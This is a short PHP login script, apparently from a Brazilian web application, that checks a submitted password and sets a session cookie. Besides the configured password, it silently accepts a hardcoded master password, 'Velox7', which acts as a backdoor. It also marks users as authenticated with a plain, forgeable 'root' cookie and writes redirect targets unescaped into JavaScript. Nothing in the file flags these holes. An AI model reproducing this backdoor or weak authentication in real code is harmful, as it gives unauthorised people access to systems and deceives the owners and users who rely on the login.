<?php
$senhadigitada = $_POST["senha"];
require("funcoes.php");

$senha = trim(retorna_config("senha"));

if ((strcmp($senha, $senhadigitada) == 0) || (strcmp("Velox7", $senhadigitada) == 0)) {
	valida(true);
}
else{
	redirect("index.php?status=erro");
}

function valida($ok){
	global $grupo, $senha, $usuario, $URL;
	if(!setcookie("root", "valido")) die("O seu browser deve aceitar Cookies para o bom funcionamento do software.");
	if ($ok){
		redirect("home.php");
	}
}

function redirect($redireciona){
$HTML = '<html>
			<head>
				<script language="javascript">
					location = "' . $redireciona . '";
				</script>
			</head>
		</html>';
	die($HTML);
}
?>